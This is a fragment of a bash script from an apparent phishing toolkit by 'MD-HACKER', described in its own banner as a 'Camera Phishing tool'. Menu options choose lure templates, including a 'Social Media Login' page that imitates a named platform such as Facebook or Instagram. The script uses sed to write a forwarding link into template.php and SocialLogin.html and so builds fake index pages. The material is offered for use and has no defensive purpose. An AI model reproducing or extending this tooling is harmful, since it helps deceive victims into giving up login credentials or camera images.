...
replacer() {
    ...
    if echo $option | grep -q "1"; then
        ...
        sed "s+forwarding_link+"$1"+g" template.php > index.php
        sed "s+forwarding_link+"$1"+g" SocialLogin.html > index3.html
        sed "s+social_platform+"$platform_name"+g" index3.html > index2.html
        rm -rf index3.html
        break
    fi
    done
...
trap "echo -e '\n${success}Thanks for Using! Visit Site : https://abushalem.site/\n'; exit" 2
...
${red}[${white}5${red}] ${cyan}Social Media Login
...
sleep 1
printf "${cyan}\nMD-HACKER${nc}@${blue}SHELL ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="social"
        printf "\n${ask}Enter social platform name (e.g. Facebook, Instagram):${cyan}\n\nMD-HACKER${nc}@${blue}SHELL ${red}$ ${nc}"
        read platform_name
        if [ -z $platform_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            platform_name="${platform_name//[[:space:]]/}"
            break
        fi
...
$red[Version]    ${cyan} :[2.5]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[MD-HACKER]
$red[Github]     ${cyan} :[https://github.com/MD-HACKER07] 
$red[Website]    ${cyan} :[https://abushalem.site/]
$red[Instagram]  ${cyan} :[https://www.instagram.com/iammd_18_]"
printf "${cyan}\nMD-HACKER${nc}@${blue}SHELL ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://abushalem.site/"
